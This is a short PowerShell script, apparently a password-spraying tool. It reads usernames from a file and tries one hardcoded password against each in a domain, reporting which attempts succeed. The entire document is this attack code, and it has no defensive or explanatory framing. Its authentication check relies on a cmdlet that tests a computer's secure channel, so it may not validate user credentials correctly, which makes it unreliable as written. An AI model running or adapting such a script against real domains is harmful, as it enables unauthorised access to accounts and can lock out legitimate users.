# Define the domain and password to use for authentication
$domain = "yourdomain.com"
$password = "Password@123" | ConvertTo-SecureString -AsPlainText -Force

# Read the usernames from the file
$usernames = Get-Content "user.txt"

# Loop through each username and attempt authentication
foreach ($username in $usernames) {
    $credential = New-Object System.Management.Automation.PSCredential($username, $password)
    
    # Attempt authentication
    try {
        $result = Test-ComputerSecureChannel -Credential $credential -Verbose
        Write-Host "Authentication successful for user: $username" -ForegroundColor Green
    } catch {
        Write-Host "Authentication failed for user: $username" -ForegroundColor Red
    }
}
